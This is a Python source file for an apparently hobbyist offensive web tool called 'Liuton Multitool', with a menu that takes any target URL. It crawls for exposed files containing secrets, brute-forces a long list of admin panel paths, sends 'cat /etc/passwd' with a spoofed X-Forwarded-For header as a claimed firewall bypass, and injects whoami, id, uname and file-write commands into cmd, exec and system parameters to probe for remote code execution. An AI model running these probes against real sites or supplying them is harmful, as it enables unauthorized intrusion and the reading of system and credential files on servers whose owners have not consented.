import os
import sys
import requests
import random
import string
import base64
import time
from fake_useragent import UserAgent
from bs4 import BeautifulSoup  # For crawling
from urllib.parse import urljoin, quote  # Importing urllib.parse for URL encoding
import subprocess
import concurrent.futures

# ANSI Colors for Dark Green
DARK_GREEN = '\033[32m'
RESET = '\033[0m'

# Function to clear the terminal screen
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# Multitool Banner
def banner():
    clear_screen()  # Clears the screen before displaying the banner
    print(f"""
{DARK_GREEN}  IBUILTTHISSHIT.exe{RESET}
{DARK_GREEN}====================={RESET}
{DARK_GREEN}    Liuton Multitool{RESET}
{DARK_GREEN}====================={RESET}
    """)

# Special File Finder
def special_file_finder(url):
    print(f"\n[+] Starting Special File Scan on {url}")
    vulnerable_extensions = ['.js', '.xml', '.php', '.env', '.backup', '.log', '.config', '.json', '.sql']
    sensitive_keywords = ['API_KEY', 'password', 'secret', 'token', 'user', 'db']

    try:
        response = requests.get(url, timeout=5)
        if response.status_code != 200:
            print("[!] Failed to access the website.")
            return

        soup = BeautifulSoup(response.text, 'html.parser')
        found_files = set()

        # Collect all links
        for tag in soup.find_all(['a', 'script', 'link']):
            attr = tag.get('href') or tag.get('src')
            if attr:
                full_url = urljoin(url, attr)
                if any(ext in full_url for ext in vulnerable_extensions):
                    found_files.add(full_url)

        # Scan the found files
        for file_url in found_files:
            try:
                file_response = requests.get(file_url, timeout=5)
                print(f"\n[+] Found File: {file_url}")
                if file_response.status_code == 200:
                    content = file_response.text
                    for keyword in sensitive_keywords:
                        if keyword in content:
                            print(f"    [!] Potential Leak: '{keyword}' found in {file_url}")
            except requests.RequestException:
                print(f"    [!] Could not access {file_url}")

    except requests.RequestException as e:
        print(f"[!] Error during request: {e}")

# Admin Finder (using threading for faster execution)
def admin_finder(url):
    print(f"\n[+] Starting Admin Panel Finder on {url}")

    # Hardcoded list of admin paths
    admin_paths = [
        'admin', 'administrator', 'admin1', 'admin2', 'admin3', 'admin4', 'admin5',
        'usuarios', 'usuario', 'moderator', 'webadmin', 'adminarea', 'bb-admin',
        'adminLogin', 'admin_area', 'panel-administracion', 'instadmin', 'memberadmin',
        'administratorlogin', 'adm', 'admin/account.php', 'admin/index.php',
        'admin/login.php', 'admin/admin.php', 'admin/account.php', 'admin_area/admin.php',
        'admin_area/login.php', 'siteadmin/login.php', 'admin/controlpanel.php', 'admin.php',
        'admincp/index.asp', 'admincp/login.asp', 'admincp/index.html', 'admin/account.html',
        'adminpanel.html', 'webadmin.html', 'webadmin/index.html', 'webadmin/admin.html',
        'webadmin/login.html', 'admin/admin_login.html', 'admin_login.html',
        'panel-administracion/login.html', 'admin/cp.php', 'cp.php', 'administrator/index.php',
        'administrator/login.php', 'nsw/admin/login.php', 'admin/admin_login.php',
        'admin_login.php', 'administrator/account.php', 'administrator.php',
        'admin_area/admin.html', 'pages/admin/admin-login.php', 'admin/admin-login.php',
        'admin-login.php', 'bb-admin/index.html', 'bb-admin/login.html', 'bb-admin/admin.html',
        'admin/home.html', 'admin_area/login.html', 'admin_area/index.html',
        'admin/controlpanel.php', 'admin.php', 'admincontrol.php', 'admin/adminLogin.html',
        'adminLogin.html', 'admin/adminLogin.html', 'home.html', 'rcjakar/admin/login.php',
        'adminarea/index.html', 'adminarea/admin.html', 'webadmin.php', 'webadmin/index.php',
        'webadmin/admin.php', 'admin/controlpanel.html', 'admin.html', 'admin/cp.html', 'cp.html',
        'adminpanel.php', 'moderator.html', 'administrator/index.html', 'administrator/login.html',
        'user.html', 'administrator/account.html', 'administrator.html', 'login.html',
        'modelsearch/login.html', 'moderator/login.html', 'adminarea/login.html',
        'panel-administracion/index.html', 'panel-administracion/admin.html', 'modelsearch/index.html',
        'modelsearch/admin.html', 'admincontrol/login.html', 'adm/index.html', 'adm.html',
        'moderator/admin.html', 'user.php', 'account.html', 'controlpanel.html', 'admincontrol.html',
        'panel-administracion/login.php', 'wp-login.php', 'adminLogin.php', 'admin/adminLogin.php',
        'home.php', 'admin.php', 'adminarea/index.php', 'adminarea/admin.php', 'adminarea/login.php',
        'panel-administracion/index.php', 'panel-administracion/admin.php', 'modelsearch/index.php',
        'modelsearch/admin.php', 'admincontrol/login.php', 'adm/admloginuser.php', 'admloginuser.php',
        'admin2.php', 'admin2/login.php', 'admin2/index.php', 'usuarios/login.php', 'adm/index.php',
        'adm.php', 'affiliate.php', 'adm_auth.php', 'memberadmin.php', 'administratorlogin.php'
    ]

    # Use threading to speed up the process
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(check_admin_path, url, path) for path in admin_paths]
        for future in concurrent.futures.as_completed(futures):
            future.result()

def check_admin_path(url, path):
    full_url = f"{url}/{path}"
    try:
        response = requests.get(full_url, timeout=5)

        if response.status_code == 200:
            print(f"[+] Found Admin Path: {full_url} [Status: 200 OK]")
        elif response.status_code == 301:
            print(f"[+] Found Admin Path: {full_url} [Status: 301 Redirect]")
        elif response.status_code == 302:
            print(f"[+] Found Admin Path: {full_url} [Status: 302 Found (Redirect)]")
        elif response.status_code == 403:
            print(f"[+] Found Admin Path: {full_url} [Status: 403 Forbidden]")
        elif response.status_code == 404:
            print(f"[-] Not Found: {full_url} [Status: 404 Not Found]")
        else:
            print(f"[+] Found Admin Path: {full_url} [Status: {response.status_code}]")
    except requests.RequestException as e:
        print(f"[-] Error accessing {full_url}: {e}")

# WAF Bypass Function (Updated)
def waf_bypass(url):
    headers = {
        'User-Agent': random.choice([
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.64 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36'
        ]),
        'X-Forwarded-For': '127.0.0.1',  # Spoofing IP address
        'Referer': 'http://example.com/',  # Customize the referer
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Connection': 'keep-alive'
    }

    payload = "cat /etc/passwd"  # The original payload
    encoded_payload = quote(payload)  # URL encode the payload to bypass WAF
    test_url = f"{url}?cmd={encoded_payload}"

    try:
        # Attempt the GET request with headers and encoded payload
        response = requests.get(test_url, headers=headers, timeout=5)

        if response.status_code == 200:
            if "root" in response.text:  # If the output of the /etc/passwd is found, it's a success
                print(f"[+] Successfully bypassed WAF and found sensitive data at: {test_url}")
            else:
                print(f"[-] WAF bypass attempt failed, no sensitive data returned at: {test_url}")
        elif response.status_code == 403:
            print(f"[-] WAF detected and blocked for {test_url} [Status: 403]")
        elif response.status_code == 404:
            print(f"[-] Page not found: {test_url} [Status: 404]")
        else:
            print(f"[+] Testing payload: {payload} [Status: {response.status_code}]")
    except requests.RequestException as e:
        print(f"[-] Error accessing {test_url}: {e}")

# RCE Scanner Function
def rce_scanner(url):
    payloads = [
        "whoami",                            # Get the system user
        "id",                                # Get the user and group IDs
        "uname -a",                          # Get system information
        "cat /etc/passwd",                   # Read sensitive system file
        "cat /flag",                         # Read CTF-like flag (for testing)
        "echo vulnerable > /tmp/vulnerable",  # Create a test file
    ]

    params = ['cmd', 'input', 'exec', 'system']  # Common param names that could be exploited for RCE

    for param in params:
        for payload in payloads:
            test_url = f"{url}?{param}={payload}"
            try:
                response = requests.get(test_url, timeout=5)
                if response.status_code == 200 and "vulnerable" in response.text:
                    print(f"[+] RCE vulnerability found with payload: {payload} at {test_url}")
                elif response.status_code == 403:
                    print(f"[-] Access Forbidden for {test_url} [Status: 403]")
                elif response.status_code == 404:
                    print(f"[-] Not Found: {test_url} [Status: 404]")
                else:
                    print(f"[+] Testing payload: {payload} [Status: {response.status_code}]")
            except requests.RequestException as e:
                print(f"[-] Error accessing {test_url}: {e}")

# Katana Scan Function
def katana_scan(url):
    print(f"\n[+] Running Katana Scan on {url}")
    try:
        result = subprocess.run(['katana', '-u', url], capture_output=True, text=True)
        print(result.stdout)
    except FileNotFoundError:
        print("[!] Katana is not installed. Please install Katana and try again.")

# Wapiti Scan Function
def wapiti_scan(url):
    print(f"\n[+] Running Wapiti Scan on {url}")
    try:
        result = subprocess.run(['wapiti', '-u', url], capture_output=True, text=True)
        print(result.stdout)
    except FileNotFoundError:
        print("[!] Wapiti is not installed. Please install Wapiti and try again.")

# Main Menu
def main():
    banner()
    print("""
[1] Special File Finder
[2] Wapiti Scan
[3] Admin Finder (with hardcoded paths)
[4] WAF Bypass (Cloudflare, NGINX, etc.)
[5] RCE Scanner
[6] Katana Scan
[0] Exit
    """)
    choice = input("[?] Select an option: ")
    if choice == '1':
        url = input("[?] Enter the target URL: ")
        special_file_finder(url)
    elif choice == '2':
        url = input("[?] Enter the target URL: ")
        wapiti_scan(url)
    elif choice == '3':
        url = input("[?] Enter the target URL: ")
        admin_finder(url)
    elif choice == '4':
        url = input("[?] Enter the target URL: ")
        waf_bypass(url)
    elif choice == '5':
        url = input("[?] Enter the target URL: ")
        rce_scanner(url)
    elif choice == '6':
        url = input("[?] Enter the target URL: ")
        katana_scan(url)
    elif choice == '0':
        print("Exiting Liuton Multitool. Goodbye!")
        sys.exit()
    else:
        print("[!] Invalid Option Selected!")
        main()

if __name__ == "__main__":
    main()
